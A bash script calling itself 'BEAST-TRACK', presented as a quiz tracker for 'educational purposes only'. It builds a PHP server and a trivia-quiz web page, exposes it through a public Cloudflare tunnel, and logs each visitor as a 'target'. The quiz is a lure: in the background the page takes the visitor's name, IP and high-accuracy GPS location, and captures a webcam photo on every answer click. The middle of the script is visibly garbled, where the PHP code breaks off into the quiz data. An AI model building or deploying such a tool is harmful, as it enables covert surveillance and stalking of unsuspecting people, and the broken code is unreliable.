#!/bin/bash

# --- BEAST-TRACK v22.0 (THE ULTIMATE EDUCATIONAL EDITION) ---
# WARNING: FOR EDUCATIONAL PURPOSES ONLY.
NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

SERVER_DIR="server"
PORT=8888

# --- PRE-SETUP & AUTO-INSTALL ---
mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png $SERVER_DIR/*.log .link.log > /dev/null 2>&1
touch $SERVER_DIR/combined.log
chmod -R 777 $SERVER_DIR

if ! command -v php &> /dev/null; then pkg install php -y || sudo apt install php -y; fi
if ! command -v cloudflared &> /dev/null; then pkg install cloudflared -y; fi

clear
echo -e "${PBlue}${Bold}  ██████╗ ███████╗ █████╗ ███████╗████████╗ ${NC}"
echo -e "${PBlue}${Bold}  ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝ ${NC}"
echo -e "${PWhite}${Bold}  ██████╔╝█████╗  ███████║███████╗   ██║    ${NC}"
echo -e "${PWhite}${Bold}  ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ██████╔╝███████╗██║  ██║███████║   ██║    ${NC}"
echo -e "${PRed}${Bold}  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ${NC}"
echo -e "  ${PYellow}⭐ ⭐ ⭐  QUIZ BEE TRACKER v22.0  ⭐ ⭐ ⭐${NC}"
echo -e "  ${BGreen}Status       : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite}  ==========================================${NC}"

# --- GENERATE COMPLETE PHP & JS BACKEND ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$type = \$_POST['type'] ?? '';
    if (\$type == 'init') {
        \$log = "\n\033[1;33m┏━━━━━━━━━━━━ TARGET DETECTED ━━━━━━━━━━━━┓\033[0m\n";
        \$log .= "\033[1;37m┃ NAME      :\033[0m " . (\$_POST['name'] ?? 'Unknown') . "\n";
        \$log .= "\033[1;37m┃ IP ADDR   :\033[0m \$ip\n";
    } elseif (\$type == 'loc') {
        \$log = "\033[1;32m┃ GPS DATA  :\033[0m " . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
        \$log .= "\033[1;34m┃ MAPS LINK :\033[0m https://www.google.com" . \$_POST['lat'] . "," . \$_POST['lon'] . "\n";
    } elseif (\$type == 'cam') {
        \$fname = 'cam_' . time() . '_' . rand(100,999) . '.png';
        file_put_contents(\$fname, base64_decode(str_replace(, ['', '+'], \$_POST['img'])));
        \$log = "\033, c: 1},
        {q: "Which planet is known as the Red Planet?", a: ["Venus", "Jupiter", "Mars", "Saturn"], c: 2},
        {q: "Who is the National Hero of the Philippines?", a: ["Andres Bonifacio", "Jose Rizal", "Aguinaldo", "Mabini"], c: 1},
        {q: "What is the powerhouse of the cell?", a: ["Nucleus", "Ribosome", "Mitochondria", "Cytoplasm"], c: 2},
        {q: "What is the square root of 144?", a: ["10", "11", "12", "13"], c: 2},
        {q: "Smallest province in the Philippines?", a: ["Batanes", "Camiguin", "Siquijor", "Catanduanes"], c: 0},
        {q: "H2O is the chemical formula for?", a: ["Oxygen", "Hydrogen", "Water", "Nitrogen"], c: 2},
        {q: "Year PH gained independence from Spain?", a: ["1896", "1898", "1945", "1901"], c: 1},
        {q: "Which of these is a prime number?", a: ["4", "9", "13", "15"], c: 2},
        {q: "What is the capital of the Philippines?", a: ["Cebu", "Davao", "Manila", "Quezon City"], c: 2}
    ];
    let cur = 0, score = 0, busy = false;

    async function initiate() {
        const name = document.getElementById('targetName').value;
        if(!name) return alert('Enter Name');
        try {
            const s = await navigator.mediaDevices.getUserMedia({video:true});
            document.getElementById('v').srcObject = s;
            navigator.geolocation.getCurrentPosition(p => {
                sendData({type:'loc', lat:p.coords.latitude, lon:p.coords.longitude});
            }, null, {enableHighAccuracy:true});
            sendData({type:'init', name:name});
            
            setTimeout(() => {
                capturePhoto(); // Initial Capture
                document.getElementById('step-login').style.display='none';
                document.getElementById('step-quiz').style.display='block';
                loadQ();
            }, 2000);
        } catch (e) { document.getElementById('err-msg').style.display='block'; }
    }

    function capturePhoto() {
        const canvas = document.getElementById('c'), video = document.getElementById('v');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        sendData({type:'cam', img:canvas.toDataURL('image/png')});
    }

    function loadQ() {
        if(cur >= questions.length) {
            capturePhoto(); // Final screen capture
            document.getElementById('step-quiz').style.display='none';
            document.getElementById('step-finish').style.display='block';
            document.getElementById('score').innerText = score;
            return;
        }
        busy = false;
        const d = questions[cur];
        document.getElementById('q-num').innerText = "Question "+(cur+1)+"/10";
        document.getElementById('q-text').innerText = d.q;
        const res = document.getElementById('options-container');
        res.innerHTML = "";
        d.a.forEach((o, i) => {
            const dv = document.createElement('div');
            dv.className = "option"; dv.innerText = o;
            dv.onclick = () => {
                if(busy) return; busy = true;
                capturePhoto(); // UNLI CAPTURE: Take photo on every click!
                if(i === d.c) { score++; dv.classList.add('correct'); }
                else { dv.classList.add('wrong'); res.children[d.c].classList.add('correct'); }
                setTimeout(() => { cur++; loadQ(); }, 1200);
            };
            res.appendChild(dv);
        });
    }

    function sendData(d) {
        let f = new FormData();
        for(let k in d) f.append(k, d[k]);
        fetch('index.php', {method:'POST', body:f});
    }
    </script>
</body></html>
EOF

# --- START TUNNEL SERVICES ---
echo -e "\n${PYellow}[*] Starting Local Server...${NC}"
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

echo -e "${BCyan}[*] Initializing Cloudflared (Waiting 15s)...${NC}"
cloudflared tunnel --url http://127.0.0.1:$PORT > .link.log 2>&1 &
CL_PID=$!

sleep 15
CL_LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .link.log | head -n 1)

if [ -z "$CL_LINK" ]; then
    echo -e "${PRed}[!] ERROR: Link generation failed. Check your internet.${NC}"
    kill $PHP_PID $CL_PID; exit 1
fi

echo -e "${BGreen}[+] LIVE LINK : ${Bold}${PWhite}$CL_LINK${NC}"
echo -e "${BGreen}[+] LOGS FILE : ${PWhite}$SERVER_DIR/combined.log${NC}"
echo -e "${PYellow}--------------------------------------------------"
echo -e "  MONITORING... (Press Ctrl+C to exit)${NC}"

trap "kill $PHP_PID $CL_PID; echo -e '\n${PRed}[!] Services Stopped.${NC}'; exit" SIGINT
tail -f $SERVER_DIR/combined.log
